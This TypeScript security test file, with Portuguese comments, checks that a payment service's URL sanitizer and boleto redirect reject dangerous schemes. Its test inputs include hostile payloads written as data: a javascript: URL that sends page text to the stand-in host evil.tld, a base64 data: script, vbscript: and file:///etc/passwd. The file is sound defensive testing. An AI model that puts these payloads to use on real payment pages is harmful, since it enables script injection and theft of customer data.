import { describe, it, expect, vi } from 'vitest';
import { PayService, urlSegura } from '@/modules/payments/pay.service';
import { assinarPagamento } from '@/modules/payments/pay-token';

/**
 * PoC de segurança — URL do boleto na página pública de pagamento.
 *
 * `boletoUrl` chega do ERP, do gateway ou da ingestão externa (`/api/ingest/faturas`),
 * sem garantia de esquema. Ele virava href em `/pay/:token` e destino do redirect em
 * `/boleto/:token` sem validação: um `javascript:` executava na nossa origem (o CSP
 * da página libera `script-src 'unsafe-inline'`), permitindo trocar o código Pix
 * exibido ao cliente final numa página que ele foi instruído a confiar.
 *
 * Comportamento seguro: só http(s) passa; o resto vira null.
 */

describe('[SEC-02] urlSegura barra esquema perigoso', () => {
  it('recusa javascript:, data: e vbscript:', () => {
    for (const u of [
      'javascript:fetch("//evil.tld?p="+document.body.innerText)',
      'JavaScript:alert(1)',
      '  javascript:alert(1)  ',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      '//evil.tld/boleto',
    ]) {
      expect(urlSegura(u)).toBeNull();
    }
  });

  it('aceita http e https, com trim', () => {
    expect(urlSegura('https://banco.com.br/boleto/1')).toBe('https://banco.com.br/boleto/1');
    expect(urlSegura('  http://banco.com.br/b  ')).toBe('http://banco.com.br/b');
  });

  it('vazio/indefinido vira null', () => {
    expect(urlSegura(undefined)).toBeNull();
    expect(urlSegura('')).toBeNull();
  });
});

describe('[SEC-02] /boleto/:token não redireciona para esquema perigoso', () => {
  const service = (boletoUrl: string | null) => {
    const prisma = {
      invoice: { findUnique: vi.fn(async () => ({ id: 'inv-1', tenantId: 'tenant-A', boletoUrl })) },
    };
    const charges = { buscarPagamento: vi.fn(async () => ({ boletoUrl })) };
    return new PayService(prisma as never, charges as never);
  };

  it('boleto salvo como javascript: não vira destino de redirect', async () => {
    const token = assinarPagamento('inv-1');
    await expect(service('javascript:alert(document.domain)').urlBoleto(token)).resolves.toBeNull();
  });

  it('boleto http(s) legítimo segue redirecionando', async () => {
    const token = assinarPagamento('inv-1');
    await expect(service('https://sgp.provedor.com.br/2via/abc').urlBoleto(token)).resolves.toBe(
      'https://sgp.provedor.com.br/2via/abc',
    );
  });

  it('token forjado não resolve fatura nenhuma', async () => {
    await expect(service('https://ok.com/b').urlBoleto('inv-1.assinaturaerrada')).resolves.toBeNull();
  });
});
